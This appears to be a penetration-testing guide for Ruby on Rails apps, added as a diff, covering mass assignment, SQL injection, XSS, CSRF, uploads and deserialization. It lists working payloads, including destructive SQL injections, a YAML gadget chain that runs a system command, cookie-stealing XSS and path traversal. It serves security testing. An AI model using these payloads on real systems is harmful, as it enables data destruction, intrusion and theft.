@@ -1,0 +1,412 @@
+<rails_security_guide>
+<title>RUBY ON RAILS SECURITY TESTING</title>
+
+<critical>Ruby on Rails applications face specific security challenges including mass assignment vulnerabilities, insecure session handling, CSRF protection gaps, and SQL injection through Active Record. Rails' convention over configuration approach can mask security issues while providing attack surfaces unique to the framework.</critical>
+
+<scope>
+- Mass assignment and strong parameters bypass
+- SQL injection through Active Record
+- Cross-Site Scripting (XSS) via ERB templates
+- CSRF protection bypass
+- Session fixation and hijacking
+- Insecure direct object references
+- File upload vulnerabilities
+- Deserialization attacks
+- ActionCable WebSocket security
+</scope>
+
+<methodology>
+1. Identify Rails version and configuration.
+2. Test for mass assignment vulnerabilities.
+3. Probe Active Record for SQL injection.
+4. Analyze session and CSRF handling.
+5. Test file upload and asset handling.
+</methodology>
+
+<identification>
+<rails_fingerprinting>
+{% raw %}
+# Rails indicators:
+# Response headers:
+X-Frame-Options: SAMEORIGIN
+X-XSS-Protection: 1; mode=block
+X-Content-Type-Options: nosniff
+X-Request-Id: uuid
+X-Runtime: 0.123
+
+# Cookies:
+_session_id=...     # Session cookie
+_csrf_token=...     # CSRF token
+remember_token=...  # Devise remember me
+
+# Error pages:
+# Development mode reveals full stack traces
+# Look for ActionController::RoutingError
+
+# Common paths:
+/rails/info/routes  # (dev mode)
+/rails/info/properties  # (dev mode)
+/rails/mailers  # (dev mode)
+{% endraw %}
+</rails_fingerprinting>
+
+<version_detection>
+{% raw %}
+# Version disclosure:
+# HTTP headers may reveal X-Powered-By or Server
+# Error pages in development mode
+# Gemfile.lock if accessible
+
+# Version-specific vulnerabilities:
+# Rails < 2.3.18: CVE-2013-0156 (YAML deserialization)
+# Rails < 3.2.22.5: CVE-2016-2098 (Action View RCE)
+# Rails < 5.2.4.2: CVE-2020-8163 (Code injection)
+# Rails < 6.0.3.1: CVE-2020-8164 (Strong params bypass)
+{% endraw %}
+</version_detection>
+</identification>
+
+<mass_assignment>
+<strong_params_bypass>
+{% raw %}
+# Vulnerable pattern (Rails 3 without strong params):
+@user = User.new(params[:user])
+
+# Strong parameters bypass attempts:
+
+# 1. Nested attributes bypass:
+POST /users
+{"user": {
+  "name": "attacker",
+  "role_attributes": {"name": "admin"},
+  "admin_attributes": {"level": 10}
+}}
+
+# 2. Array injection:
+{"user": {
+  "roles": ["admin", "superuser"]
+}}
+
+# 3. Hash injection for polymorphic:
+{"user": {
+  "attachable_type": "Admin",
+  "attachable_id": 1
+}}
+
+# 4. _destroy bypass:
+{"user": {
+  "posts_attributes": {
+    "0": {"_destroy": "false", "content": "injected"}
+  }
+}}
+{% endraw %}
+</strong_params_bypass>
+
+<permitted_params_abuse>
+{% raw %}
+# If permit! used (dangerous):
+params.require(:user).permit!  # Permits everything
+
+# Deep nested bypass:
+{"user": {
+  "profile": {
+    "settings": {
+      "admin": true
+    }
+  }
+}}
+
+# ID injection:
+{"user": {
+  "id": 1,  # May reassign ID
+  "created_at": "2020-01-01"
+}}
+{% endraw %}
+</permitted_params_abuse>
+</mass_assignment>
+
+<active_record_injection>
+<sql_injection>
+{% raw %}
+# Unsafe Active Record patterns:
+
+# Direct string interpolation:
+User.where("name = '#{params[:name]}'")
+# Inject: ' OR '1'='1
+
+# Order clause injection:
+User.order(params[:sort])
+# Inject: name; DROP TABLE users; --
+
+# Limit/offset injection:
+User.limit(params[:limit])
+# Inject: 1; DELETE FROM users; --
+
+# Select injection:
+User.select(params[:fields])
+# Inject: *, (SELECT password FROM users LIMIT 1) AS leaked
+
+# Pluck injection:
+User.pluck(params[:column])
+# Inject: sql expression
+
+# Group/Having injection:
+User.group(params[:group])
+# Inject: name HAVING 1=1; --
+{% endraw %}
+</sql_injection>
+
+<arel_injection>
+{% raw %}
+# Arel method injection:
+# If user input passed to Arel:
+User.where(Arel.sql(params[:condition]))
+
+# Find_by with hash:
+User.find_by(params[:query])
+# Inject: {"admin": true}
+
+# Safe patterns (for reference):
+User.where("name = ?", params[:name])
+User.where(name: params[:name])
+{% endraw %}
+</arel_injection>
+</active_record_injection>
+
+<session_attacks>
+<session_security>
+{% raw %}
+# Session configuration issues:
+
+# Check session cookie settings:
+# - HttpOnly flag missing
+# - Secure flag missing (HTTPS)
+# - SameSite not set
+
+# Session fixation:
+# 1. Get session ID before login
+# 2. Force victim to use that session
+# 3. Session retained after authentication
+
+# Test reset_session on login:
+# Rails should call reset_session after authentication
+
+# CookieStore vulnerabilities:
+# Session data stored in cookie
+# Can be decoded (base64) to reveal contents
+# Signed but not encrypted (by default)
+{% endraw %}
+</session_security>
+
+<csrf_bypass>
+{% raw %}
+# CSRF protection bypass:
+
+# 1. Check if protect_from_forgery present:
+# Missing in API controllers
+
+# 2. Null origin bypass:
+Origin: null
+# Some configurations accept null
+
+# 3. Subdomain bypass:
+Origin: https://evil.example.com
+# If wildcard subdomain allowed
+
+# 4. Content-Type bypass:
+# Using text/plain or multipart/form-data
+
+# 5. Token in meta tag:
+<meta name="csrf-token" content="TOKEN">
+# Steal via XSS
+{% endraw %}
+</csrf_bypass>
+</session_attacks>
+
+<xss_attacks>
+<erb_xss>
+{% raw %}
+# ERB template XSS:
+
+# Vulnerable (raw output):
+<%= raw user_input %>
+<%== user_input %>
+<%= user_input.html_safe %>
+
+# Content-tag with user input:
+<%= content_tag(:div, params[:content]) %>
+
+# JSON in script tags:
+<script>
+  var data = <%= @user.to_json.html_safe %>;
+</script>
+
+# Link_to href:
+<%= link_to "Click", params[:url] %>
+# Inject: javascript:alert(1)
+{% endraw %}
+</erb_xss>
+
+<haml_slim_xss>
+{% raw %}
+# HAML XSS:
+!= user_input  # Unescaped output
+= raw user_input
+
+# Slim XSS:
+== user_input  # Unescaped
+
+# Safe patterns:
+= user_input  # Auto-escaped
+{% endraw %}
+</haml_slim_xss>
+</xss_attacks>
+
+<file_upload>
+<upload_vulnerabilities>
+{% raw %}
+# CarrierWave vulnerabilities:
+# - Filename manipulation
+# - Content-type bypass
+# - Path traversal
+
+# Test filename:
+filename: "../../../etc/passwd"
+filename: "shell.php\x00.jpg"
+filename: "test.jpg.erb"
+
+# Active Storage issues:
+# - Direct URL access
+# - Missing authorization on blobs
+GET /rails/active_storage/blobs/xxx/file.jpg
+
+# Paperclip (deprecated):
+# - Command injection in ImageMagick
+# - Spoofed content type
+{% endraw %}
+</upload_vulnerabilities>
+</file_upload>
+
+<deserialization>
+<yaml_attacks>
+{% raw %}
+# YAML deserialization (older Rails):
+# CVE-2013-0156
+
+# Malicious YAML payload:
+--- !ruby/object:Gem::Installer
+i: x
+--- !ruby/object:Gem::SpecFetcher
+i: y
+--- !ruby/object:Gem::Requirement
+requirements:
+  !ruby/object:Gem::Package::TarReader
+  io: &1 !ruby/object:Net::BufferedIO
+    io: &1 !ruby/object:Gem::Package::TarReader::Entry
+       read: 0
+       header: "abc"
+    debug_output: &1 !ruby/object:Net::WriteAdapter
+       socket: &1 !ruby/object:Gem::RequestSet
+           sets: !ruby/object:Net::WriteAdapter
+               socket: !ruby/module 'Kernel'
+               method_id: :system
+           git_set: id
+       method_id: :resolve
+{% endraw %}
+</yaml_attacks>
+
+<marshal_attacks>
+{% raw %}
+# Marshal deserialization:
+# If user input passed to Marshal.load
+
+# Cookie tampering (if signed but not encrypted):
+# Decode cookie, modify, re-encode
+# May not need signature if vulnerable version
+{% endraw %}
+</marshal_attacks>
+</deserialization>
+
+<actioncable>
+<websocket_security>
+{% raw %}
+# ActionCable WebSocket testing:
+
+# Connection authentication:
+# Check if connection rejects unauthenticated users
+
+# Channel authorization:
+# Can user subscribe to unauthorized channels?
+{"command": "subscribe", "identifier": "{\"channel\":\"AdminChannel\"}"}
+
+# Data injection:
+# Send malicious data to channels
+{"command": "message", "identifier": "...", "data": "{\"action\":\"dangerous\"}"}
+
+# Broadcast sniffing:
+# Subscribe to broad channels for data leakage
+{% endraw %}
+</websocket_security>
+</actioncable>
+
+<common_payloads>
+{% raw %}
+# Mass assignment:
+{"user": {"admin": true, "role": "superuser"}}
+
+# SQL injection:
+' OR '1'='1' --
+name; DROP TABLE users; --
+
+# XSS via link_to:
+javascript:alert(document.cookie)
+
+# CSRF token theft:
+document.querySelector('meta[name="csrf-token"]').content
+
+# File upload:
+../../../etc/passwd
+test.jpg\x00.rb
+{% endraw %}
+</common_payloads>
+
+<validation>
+1. Demonstrate mass assignment changing unauthorized attributes.
+2. Show SQL injection via Active Record with data extraction.
+3. Prove XSS through unescaped template output.
+4. Document CSRF bypass or token leakage.
+5. Provide evidence of session fixation or cookie manipulation.
+</validation>
+
+<false_positives>
+- Strong parameters properly configured
+- All queries use parameterized inputs
+- ERB auto-escaping not bypassed
+- CSRF protection with proper token validation
+- Secure session configuration with reset on login
+</false_positives>
+
+<impact>
+- Privilege escalation via mass assignment
+- Data breach via SQL injection
+- Account takeover via XSS/CSRF
+- Remote code execution via deserialization
+- File system access via upload vulnerabilities
+- Session hijacking
+</impact>
+
+<pro_tips>
+1. Check for permit! in controllers - it's a major red flag.
+2. Order and group clauses are commonly injectable.
+3. Development mode routes expose sensitive information.
+4. CookieStore sessions can be decoded for information.
+5. html_safe and raw are XSS indicators.
+6. ActionCable may lack connection-level auth.
+7. Older Rails versions have severe deserialization bugs.
+8. Check Gemfile.lock for vulnerable gem versions.
+9. API controllers often skip CSRF protection.
+10. Active Storage blobs may be publicly accessible.
+</pro_tips>
+
+<remember>Rails provides security by default, but developers can easily bypass protections. Mass assignment via permit!, SQL injection in order/group clauses, and template XSS via html_safe are the most common Rails vulnerabilities. Always check for development mode exposure and review session/CSRF configuration.</remember>
+</rails_security_guide>
